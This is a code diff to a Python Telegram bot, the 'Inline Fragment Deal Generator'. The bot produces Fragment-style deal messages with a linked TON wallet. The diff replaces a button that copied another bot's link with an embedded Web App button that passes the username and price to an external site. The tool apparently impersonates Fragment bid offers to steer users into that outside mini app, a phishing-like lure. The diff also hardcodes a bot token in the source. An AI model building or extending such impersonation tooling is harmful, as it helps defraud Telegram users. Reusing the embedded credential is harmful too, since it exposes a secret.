@@ -6,18 +6,20 @@ import asyncio
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from urllib.parse import urlparse, parse_qs
 import threading
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, MessageEntity
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, MessageEntity, WebAppInfo
 from telegram.ext import Application, InlineQueryHandler, ContextTypes
 
 # Configuration
 BOT_TOKEN = '7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c'
 PORT = int(os.getenv('PORT', 10000))
 WEBHOOK_URL = "https://telegram-bot-vic3.onrender.com"
+WEBAPP_URL = "https://myminiapp.onrender.com"  # 🔗 URL de votre site web
 
-print(f"🤖 Inline Fragment Deal Generator v4.6")
+print(f"🤖 Inline Fragment Deal Generator v4.7")
 print(f"🔑 Token: ✅")
 print(f"🌐 Port: {PORT}")
 print(f"🔗 Webhook: {WEBHOOK_URL}")
+print(f"📱 Web App: {WEBAPP_URL}")
 
 # Variables globales
 app = None
@@ -123,23 +125,27 @@ Important:
             length=len(important_text2)
         ))
     
-    # 5. Wallet cliquable - POSITION ET LONGUEUR EXACTES
+    # 5. Wallet cliquable - LONGUEUR CORRECTE (48 caractères: UQ...PR)
     wallet_start = fragment_message.find(wallet_address)
     if wallet_start != -1:
         entities.append(MessageEntity(
             type=MessageEntity.TEXT_LINK,
             offset=wallet_start,
-            length=len(wallet_address),  # Longueur exacte de l'adresse (48 caractères)
+            length=48,  # Longueur exacte de UQ...PR (48 caractères)
             url=f"https://tonviewer.com/{wallet_address}"
         ))
-        print(f"🔗 Wallet link: position {wallet_start}, longueur {len(wallet_address)} caractères")
-        print(f"🔗 Adresse wallet: '{wallet_address}' (longueur: {len(wallet_address)})")
+        print(f"🔗 Wallet link: position {wallet_start}, longueur 48 caractères")
     
-    # URL du bouton - identique au bot original
-    button_url = f"https://t.me/BidRequestApp_bot/?startapp={username.lower()}-{price:g}"
+    # 📱 BOUTON WEB APP INTÉGRÉ - Reste dans Telegram
+    webapp_url = f"{WEBAPP_URL}?user={username}&price={price:g}"
+    keyboard = InlineKeyboardMarkup([[
+        InlineKeyboardButton(
+            "📱 View Details", 
+            web_app=WebAppInfo(url=webapp_url)
+        )
+    ]])
     
-    # Bouton - identique au bot original
-    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("View details", url=button_url)]])
+    print(f"🔗 Web App URL générée (intégrée): {webapp_url}")
     
     return fragment_message, entities, keyboard
 
@@ -246,7 +252,7 @@ class WebhookHandler(BaseHTTPRequestHandler):
         self.send_header('Content-Type', 'text/plain')
         self.end_headers()
         
-        status = f"✅ Bot Status: Online\n🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}"
+        status = f"✅ Bot Status: Online\n🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}\n📱 Web App (Intégrée): {WEBAPP_URL}"
         self.wfile.write(status.encode('utf-8'))
     
     def log_message(self, format, *args):
